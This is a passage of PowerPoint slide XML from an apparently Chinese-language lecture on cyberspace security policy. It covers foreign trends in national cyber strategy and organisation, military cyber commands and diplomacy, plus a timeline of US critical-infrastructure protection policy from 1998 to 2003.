                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13"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123">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="17"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12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123">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="21"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12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123">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="5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123">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="29" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="512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12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123">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="33" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="512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12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123">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="512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12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467544" y="1124744"/>
            <a:ext cx="8136904" cy="5173336"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="179512" y="637381"/>
            <a:ext cx="7632848" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>国外网络空间安全保障体系的最新趋势</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37870534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9810" y="675197"/>
            <a:ext cx="7734638" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>国外网络空间安全保障体系的最新趋势</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="902998" y="5604661"/>
            <a:ext cx="7989482" cy="502266"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>关键基础设施仍然是网络空间安全保障的最核心内容</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="866957" y="1325097"/>
            <a:ext cx="7449439" cy="480131"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>战略：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>发布网络安全战略、政策评估报告、推进计划等文件</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="862842" y="1811023"/>
            <a:ext cx="7453574" cy="803297"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>组织：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>通过设立网络安全协调机构、设立协调官，强化集中领导和综合协调</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="869810" y="2576810"/>
            <a:ext cx="7565018" cy="1126462"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>军事：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>陆续成立网络战司令部，开展大规模攻防演练，招募网络战精英人才，加快军事网络和通信系统的升级改造，网络战成为热门话题</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899912" y="3665762"/>
            <a:ext cx="7534916" cy="1126462"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>外交：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息安全问题的国际交流与对话增多，美欧盟友之间网络协同攻防倾向愈加明显，信息安全成为国际多边或双边谈判的实质性内容</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899592" y="4766842"/>
            <a:ext cx="7416804" cy="765787"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>科技：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>各国寻求走突破性跨越式发展路线推进技术创新，力求在科技发展上保持和占据优势地位</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19174075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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="3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8" grpId="0"/>
      <p:bldP spid="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WordArt 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1" noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2627314" y="3213100"/>
            <a:ext cx="3746499" cy="1152525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" fromWordArt="1">
            <a:prstTxWarp prst="textCanDown">
              <a:avLst>
                <a:gd name="adj" fmla="val 28037"/>
              </a:avLst>
            </a:prstTxWarp>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" kern="10" dirty="0">
                <a:ln w="9525">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:round/>
                  <a:headEnd/>
                  <a:tailEnd/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="宋体"/>
                <a:ea typeface="宋体"/>
              </a:rPr>
              <a:t>网络空间国家安全战略框架</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="Group 4"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1403350" y="1555750"/>
            <a:ext cx="2881313" cy="4280675"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="1769" cy="2631"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9239" name="AutoShape 5"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="-5400000">
              <a:off x="-431" y="431"/>
              <a:ext cx="2631" cy="176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61 w 21600"/>
                <a:gd name="T19" fmla="*/ 3162 h 21600"/>
                <a:gd name="T20" fmla="*/ 18439 w 21600"/>
                <a:gd name="T21" fmla="*/ 18438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240" name="Text Box 6"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="152" y="498"/>
              <a:ext cx="302" cy="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en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>98</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>年克林顿政府</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>PDD63</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 7"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="2589775" y="1080400"/>
            <a:ext cx="4321175" cy="2529456"/>
            <a:chOff x="0" y="-24"/>
            <a:chExt cx="2631" cy="1876"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9237" name="AutoShape 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="0" y="-24"/>
              <a:ext cx="2631" cy="18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61 w 21600"/>
                <a:gd name="T19" fmla="*/ 3162 h 21600"/>
                <a:gd name="T20" fmla="*/ 18439 w 21600"/>
                <a:gd name="T21" fmla="*/ 18438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238" name="Text Box 9"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="330" y="193"/>
              <a:ext cx="2036"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en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>00</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>年信息系统保护国家计划   </a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="Group 10"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4880327" y="1760394"/>
            <a:ext cx="2571700" cy="4247693"/>
            <a:chOff x="-67" y="6"/>
            <a:chExt cx="1975" cy="2598"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9235" name="AutoShape 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="5400000">
              <a:off x="-378" y="317"/>
              <a:ext cx="2598" cy="197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61 w 21600"/>
                <a:gd name="T19" fmla="*/ 3162 h 21600"/>
                <a:gd name="T20" fmla="*/ 18439 w 21600"/>
                <a:gd name="T21" fmla="*/ 18438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236" name="Text Box 12"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1365" y="595"/>
              <a:ext cx="378" cy="1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en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>01</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>年布什政府</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>PCIPB   </a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="Group 13"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="2016125" y="3953468"/>
            <a:ext cx="4404940" cy="2451905"/>
            <a:chOff x="0" y="-149"/>
            <a:chExt cx="2631" cy="1918"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9233" name="AutoShape 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="10800000">
              <a:off x="0" y="-149"/>
              <a:ext cx="2631" cy="191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61 w 21600"/>
                <a:gd name="T19" fmla="*/ 3162 h 21600"/>
                <a:gd name="T20" fmla="*/ 18439 w 21600"/>
                <a:gd name="T21" fmla="*/ 18438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234" name="Text Box 15"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="395" y="1243"/>
              <a:ext cx="203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en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>03</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>年保护网际空间国家战略  </a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110608" name="AutoShape 16"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="1341438"/>
            <a:ext cx="1512888" cy="1655762"/>
          </a:xfrm>
          <a:prstGeom prst="borderCallout1">
            <a:avLst>
              <a:gd name="adj1" fmla="val 38786"/>
              <a:gd name="adj2" fmla="val 100052"/>
              <a:gd name="adj3" fmla="val 111296"/>
              <a:gd name="adj4" fmla="val 126478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1998</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>月，克林顿政府发布了第</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>63</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>号总统令（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>PDD63</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>）：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>克林顿政府对关键基础设施保护的政策</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>》 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110609" name="AutoShape 17"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7506236" y="1063189"/>
            <a:ext cx="1512887" cy="2016125"/>
          </a:xfrm>
          <a:prstGeom prst="borderCallout1">
            <a:avLst>
              <a:gd name="adj1" fmla="val 41674"/>
